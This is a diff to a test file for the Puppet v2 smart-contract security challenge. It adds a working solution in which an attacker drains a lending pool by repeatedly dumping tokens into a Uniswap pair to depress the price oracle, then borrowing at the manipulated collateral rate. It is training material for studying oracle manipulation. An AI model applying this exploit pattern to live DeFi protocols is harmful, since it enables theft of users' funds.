@@ -16,7 +16,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         await ethers.provider.send("hardhat_setBalance", [
@@ -28,7 +28,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();
@@ -38,7 +38,7 @@ describe('[Challenge] Puppet v2', function () {
         this.uniswapRouter = await UniswapRouterFactory.deploy(
             this.uniswapFactory.address,
             this.weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await this.token.approve(
@@ -82,12 +82,93 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // 1) make prices goes down by selling all DVT to swap pool
+        ONE = await ethers.utils.parseEther('1');
+        b4 = await this.lendingPool.calculateDepositOfWETHRequired(ONE);
+        console.log(b4);
+        await this.token.connect(attacker).approve(this.uniswapRouter.address,
+            this.token.balanceOf(attacker.address));
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            this.token.balanceOf(attacker.address),
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        );
+        after = await this.lendingPool.calculateDepositOfWETHRequired(ONE);
+        console.log(after);
+        // my_weth = await this.weth.balanceOf(attacker.address);
+        // console.log(my_weth);
+
+        // 2) Now, price is down, perform borrowing
+        // Unfortunately, at this point, we can borrow about 333333 ETH
+        const firstBorrowAmount = ethers.utils.parseEther('100000');
+        await this.weth.connect(attacker).approve(this.lendingPool.address,
+            this.weth.balanceOf(attacker.address));
+        await this.lendingPool.connect(attacker).borrow(
+            firstBorrowAmount // 0.1 * POOL_BALANCE
+        );
+        afterBorrow = await this.lendingPool.calculateDepositOfWETHRequired(ONE);
+        console.log(afterBorrow);
+
+        // 3) Now we have more DVT, selling them further to make prices lower
+        await this.token.connect(attacker).approve(this.uniswapRouter.address,
+            this.token.balanceOf(attacker.address));
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            this.token.balanceOf(attacker.address),
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        );
+
+        // 4) Borrow again, now the lending pool should be out of DVT
+        await this.weth.connect(attacker).approve(this.lendingPool.address,
+            this.weth.balanceOf(attacker.address));
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE.sub(firstBorrowAmount)
+        );
+
+        // 5) Trading token back with uniswap, the swap pool should be
+        //    a better deal than the lending pool.
+        //    (My implementation sell most of the WETH for DVT)
+        await this.weth.connect(attacker).approve(this.uniswapRouter.address,
+            this.weth.balanceOf(attacker.address));
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            this.weth.balanceOf(attacker.address),
+            0,
+            [this.weth.address, this.token.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        );
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
+
+        // Alternative 5): exact POOL_INITIAL_TOKEN_BALANCE (1,000,000 ETH)
+        /*await this.uniswapRouter.connect(attacker).swapTokensForExactTokens(
+            firstBorrowAmount,
+            this.weth.balanceOf(attacker.address),
+            [this.weth.address, this.token.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6}
+        );
+        expect(
+          await this.token.balanceOf(attacker.address)
+        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE);*/
+
     });
+
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
-        // Attacker has taken all tokens from the pool        
+        // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.eq('0');
